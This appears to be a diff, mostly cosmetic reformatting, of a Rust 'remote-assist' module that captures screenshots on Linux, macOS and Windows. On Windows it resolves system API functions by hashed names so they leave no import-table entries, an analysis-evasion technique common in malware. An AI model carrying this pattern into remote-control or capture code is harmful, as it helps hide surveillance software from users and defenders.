@@ -9,8 +9,8 @@
 
 #![cfg(feature = "remote-assist")]
 
-use anyhow::{anyhow, Result};
 use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
+use anyhow::{anyhow, Result};
 #[cfg(any(target_os = "linux", windows, target_os = "macos"))]
 use enigo::{Coordinate, Direction, Enigo, Keyboard, Mouse, Settings};
 #[cfg(any(target_os = "linux", windows, target_os = "macos"))]
@@ -145,8 +145,10 @@ fn capture_x11() -> Result<Vec<u8>> {
 fn capture_fb0() -> Result<Vec<u8>> {
     use std::io::Read;
 
-    let virt_size = std::fs::read_to_string("/sys/class/graphics/fb0/virtual_size")
-        .map_err(|e| anyhow!("/dev/fb0 not available: /sys/class/graphics/fb0/virtual_size: {e}"))?;
+    let virt_size =
+        std::fs::read_to_string("/sys/class/graphics/fb0/virtual_size").map_err(|e| {
+            anyhow!("/dev/fb0 not available: /sys/class/graphics/fb0/virtual_size: {e}")
+        })?;
     let mut parts = virt_size.trim().split(',');
     let width: u32 = parts
         .next()
@@ -174,8 +176,8 @@ fn capture_fb0() -> Result<Vec<u8>> {
         .ok_or_else(|| anyhow!("fb0 dimensions overflow"))?;
 
     let mut fb_data = vec![0u8; expected];
-    let mut fb = std::fs::File::open("/dev/fb0")
-        .map_err(|e| anyhow!("/dev/fb0 open failed: {e}"))?;
+    let mut fb =
+        std::fs::File::open("/dev/fb0").map_err(|e| anyhow!("/dev/fb0 open failed: {e}"))?;
     fb.read_exact(&mut fb_data)
         .map_err(|e| anyhow!("/dev/fb0 read failed: {e}"))?;
 
@@ -259,10 +261,9 @@ async fn capture_wayland_portal_async() -> Result<Vec<u8>> {
         .map_err(|e| anyhow!("invalid path: {e}"))?
         .build();
 
-    let mut signal_stream =
-        zbus::MessageStream::for_match_rule(match_rule, &conn, Some(1))
-            .await
-            .map_err(|e| anyhow!("failed to subscribe to portal response signal: {e}"))?;
+    let mut signal_stream = zbus::MessageStream::for_match_rule(match_rule, &conn, Some(1))
+        .await
+        .map_err(|e| anyhow!("failed to subscribe to portal response signal: {e}"))?;
 
     // Build the options dictionary for the Screenshot portal call.
     let mut opts: HashMap<&str, Value<'_>> = HashMap::new();
@@ -280,20 +281,17 @@ async fn capture_wayland_portal_async() -> Result<Vec<u8>> {
     .map_err(|e| anyhow!("Screenshot portal call failed: {e}"))?;
 
     // Wait for the response signal, with a 30-second timeout.
-    let msg = tokio::time::timeout(
-        std::time::Duration::from_secs(30),
-        signal_stream.next(),
-    )
-    .await
-    .map_err(|_| anyhow!("xdg-desktop-portal did not respond within 30 seconds"))?
-    .ok_or_else(|| anyhow!("portal signal stream ended without a Response"))?
-    .map_err(|e| anyhow!("portal D-Bus message error: {e}"))?;
+    let msg = tokio::time::timeout(std::time::Duration::from_secs(30), signal_stream.next())
+        .await
+        .map_err(|_| anyhow!("xdg-desktop-portal did not respond within 30 seconds"))?
+        .ok_or_else(|| anyhow!("portal signal stream ended without a Response"))?
+        .map_err(|e| anyhow!("portal D-Bus message error: {e}"))?;
 
     // Parse the body: (response_code: u32, results: a{sv})
-    let (response, results): (u32, HashMap<String, zbus::zvariant::OwnedValue>) =
-        msg.body()
-            .deserialize()
-            .map_err(|e| anyhow!("failed to deserialize portal Response body: {e}"))?;
+    let (response, results): (u32, HashMap<String, zbus::zvariant::OwnedValue>) = msg
+        .body()
+        .deserialize()
+        .map_err(|e| anyhow!("failed to deserialize portal Response body: {e}"))?;
 
     if response != 0 {
         return Err(anyhow!(
@@ -375,10 +373,16 @@ unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) 
         Some(m) => m,
         None => {
             let load_library_w: unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void =
-                resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"LoadLibraryW\0"))?;
+                resolve_api(
+                    pe_resolve::HASH_KERNEL32_DLL,
+                    pe_resolve::hash_str(b"LoadLibraryW\0"),
+                )?;
             let m = load_library_w(dll_wide.as_ptr());
             if m.is_null() {
-                return Err(anyhow!("LoadLibraryW failed for DLL (hash 0x{:08X})", dll_hash));
+                return Err(anyhow!(
+                    "LoadLibraryW failed for DLL (hash 0x{:08X})",
+                    dll_hash
+                ));
             }
             m as usize
         }
@@ -390,63 +394,92 @@ unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) 
 
 // ── user32.dll wide string & hash ────────────────────────────────────────────
 #[cfg(windows)]
-const USER32_DLL_W: &[u16] = &['u' as u16, 's' as u16, 'e' as u16, 'r' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+const USER32_DLL_W: &[u16] = &[
+    'u' as u16, 's' as u16, 'e' as u16, 'r' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16,
+    'l' as u16, 'l' as u16, 0,
+];
 #[cfg(windows)]
 const HASH_USER32_DLL: u32 = hash_wstr_const(USER32_DLL_W);
 
 // ── gdi32.dll wide string & hash ─────────────────────────────────────────────
 #[cfg(windows)]
-const GDI32_DLL_W: &[u16] = &['g' as u16, 'd' as u16, 'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+const GDI32_DLL_W: &[u16] = &[
+    'g' as u16, 'd' as u16, 'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16,
+    'l' as u16, 0,
+];
 #[cfg(windows)]
 const HASH_GDI32_DLL: u32 = hash_wstr_const(GDI32_DLL_W);
 
 // ── API hash constants (user32) ──────────────────────────────────────────────
 #[cfg(windows)]
-const HASH_GETDC: u32            = hash_str_const(b"GetDC\0");
+const HASH_GETDC: u32 = hash_str_const(b"GetDC\0");
 #[cfg(windows)]
-const HASH_RELEASEDC: u32        = hash_str_const(b"ReleaseDC\0");
+const HASH_RELEASEDC: u32 = hash_str_const(b"ReleaseDC\0");
 #[cfg(windows)]
 const HASH_GETSYSTEMMETRICS: u32 = hash_str_const(b"GetSystemMetrics\0");
 
 // ── API hash constants (gdi32) ───────────────────────────────────────────────
 #[cfg(windows)]
-const HASH_BITBLT: u32                = hash_str_const(b"BitBlt\0");
+const HASH_BITBLT: u32 = hash_str_const(b"BitBlt\0");
 #[cfg(windows)]
 const HASH_CREATECOMPATIBLEBITMAP: u32 = hash_str_const(b"CreateCompatibleBitmap\0");
 #[cfg(windows)]
-const HASH_CREATECOMPATIBLEDC: u32    = hash_str_const(b"CreateCompatibleDC\0");
+const HASH_CREATECOMPATIBLEDC: u32 = hash_str_const(b"CreateCompatibleDC\0");
 #[cfg(windows)]
-const HASH_DELETEDC: u32             = hash_str_const(b"DeleteDC\0");
+const HASH_DELETEDC: u32 = hash_str_const(b"DeleteDC\0");
 #[cfg(windows)]
-const HASH_DELETEOBJECT: u32          = hash_str_const(b"DeleteObject\0");
+const HASH_DELETEOBJECT: u32 = hash_str_const(b"DeleteObject\0");
 #[cfg(windows)]
-const HASH_GETDIBITS: u32            = hash_str_const(b"GetDIBits\0");
+const HASH_GETDIBITS: u32 = hash_str_const(b"GetDIBits\0");
 #[cfg(windows)]
-const HASH_SELECTOBJECT: u32          = hash_str_const(b"SelectObject\0");
+const HASH_SELECTOBJECT: u32 = hash_str_const(b"SelectObject\0");
 
 // ── Function pointer types (user32) ──────────────────────────────────────────
 #[cfg(windows)]
-type FnGetDC          = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
+type FnGetDC = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
 #[cfg(windows)]
-type FnReleaseDC      = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void) -> i32;
+type FnReleaseDC = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void) -> i32;
 #[cfg(windows)]
 type FnGetSystemMetrics = unsafe extern "system" fn(i32) -> i32;
 
 // ── Function pointer types (gdi32) ───────────────────────────────────────────
 #[cfg(windows)]
-type FnBitBlt                = unsafe extern "system" fn(*mut std::ffi::c_void, i32, i32, i32, i32, *mut std::ffi::c_void, i32, i32, u32) -> i32;
+type FnBitBlt = unsafe extern "system" fn(
+    *mut std::ffi::c_void,
+    i32,
+    i32,
+    i32,
+    i32,
+    *mut std::ffi::c_void,
+    i32,
+    i32,
+    u32,
+) -> i32;
 #[cfg(windows)]
-type FnCreateCompatibleBitmap = unsafe extern "system" fn(*mut std::ffi::c_void, i32, i32) -> *mut std::ffi::c_void;
+type FnCreateCompatibleBitmap =
+    unsafe extern "system" fn(*mut std::ffi::c_void, i32, i32) -> *mut std::ffi::c_void;
 #[cfg(windows)]
-type FnCreateCompatibleDC    = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
+type FnCreateCompatibleDC =
+    unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
 #[cfg(windows)]
-type FnDeleteDC              = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+type FnDeleteDC = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
 #[cfg(windows)]
-type FnDeleteObject          = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+type FnDeleteObject = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
 #[cfg(windows)]
-type FnGetDIBits             = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, u32, u32, *mut std::ffi::c_void, *mut winapi::um::wingdi::BITMAPINFO, u32) -> i32;
+type FnGetDIBits = unsafe extern "system" fn(
+    *mut std::ffi::c_void,
+    *mut std::ffi::c_void,
+    u32,
+    u32,
+    *mut std::ffi::c_void,
+    *mut winapi::um::wingdi::BITMAPINFO,
+    u32,
+) -> i32;
 #[cfg(windows)]
-type FnSelectObject          = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void) -> *mut std::ffi::c_void;
+type FnSelectObject = unsafe extern "system" fn(
+    *mut std::ffi::c_void,
+    *mut std::ffi::c_void,
+) -> *mut std::ffi::c_void;
 
 #[cfg(not(windows))]
 fn check_consent() -> Result<()> {
@@ -473,7 +506,7 @@ fn check_consent() -> Result<()> {
 
     let hkcu = RegKey::predef(HKEY_CURRENT_USER);
     let sys_key = hkcu.open_subkey("Software\\SysNotify")?;
-    let consent: u32 = sys_key.get_value("Consent")?;;
+    let consent: u32 = sys_key.get_value("Consent")?;
     if consent == 1 {
         Ok(())
     } else {
@@ -525,8 +558,7 @@ pub fn take_screenshot() -> Result<Vec<u8>> {
             // Resolve user32 functions at runtime (no IAT entries).
             let get_system_metrics: FnGetSystemMetrics =
                 resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETSYSTEMMETRICS)?;
-            let get_dc: FnGetDC =
-                resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETDC)?;
+            let get_dc: FnGetDC = resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETDC)?;
             let release_dc: FnReleaseDC =
                 resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_RELEASEDC)?;
 
@@ -537,8 +569,7 @@ pub fn take_screenshot() -> Result<Vec<u8>> {
                 resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_CREATECOMPATIBLEBITMAP)?;
             let select_object: FnSelectObject =
                 resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_SELECTOBJECT)?;
-            let bit_blt: FnBitBlt =
-                resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_BITBLT)?;
+            let bit_blt: FnBitBlt = resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_BITBLT)?;
             let get_di_bits: FnGetDIBits =
                 resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_GETDIBITS)?;
             let delete_object: FnDeleteObject =
@@ -633,15 +664,15 @@ pub fn take_screenshot() -> Result<Vec<u8>> {
                 chunk.swap(0, 2);
             }
 
-            let img =
-                image::ImageBuffer::<image::Rgba<u8>, _>::from_raw(width as u32, height as u32, pixels)
-                    .ok_or_else(|| anyhow!("failed to construct RGBA image buffer from GDI pixels"))?;
+            let img = image::ImageBuffer::<image::Rgba<u8>, _>::from_raw(
+                width as u32,
+                height as u32,
+                pixels,
+            )
+            .ok_or_else(|| anyhow!("failed to construct RGBA image buffer from GDI pixels"))?;
 
             let mut png_buf: Vec<u8> = Vec::new();
-            img.write_to(
-                &mut Cursor::new(&mut png_buf),
-                image::ImageFormat::Png,
-            )?;
+            img.write_to(&mut Cursor::new(&mut png_buf), image::ImageFormat::Png)?;
             png_buf
         };
         Ok(png_bytes)
@@ -786,8 +817,11 @@ pub fn take_screenshot() -> Result<Vec<u8>> {
                         }
                     }
 
-                    let img = ImageBuffer::<Rgba<u8>, _>::from_raw(width as u32, height as u32, rgba)
-                        .ok_or_else(|| anyhow!("failed to create image buffer from CoreGraphics data"))?;
+                    let img =
+                        ImageBuffer::<Rgba<u8>, _>::from_raw(width as u32, height as u32, rgba)
+                            .ok_or_else(|| {
+                                anyhow!("failed to create image buffer from CoreGraphics data")
+                            })?;
 
                     let mut out = Vec::new();
                     img.write_to(&mut Cursor::new(&mut out), image::ImageFormat::Png)?;
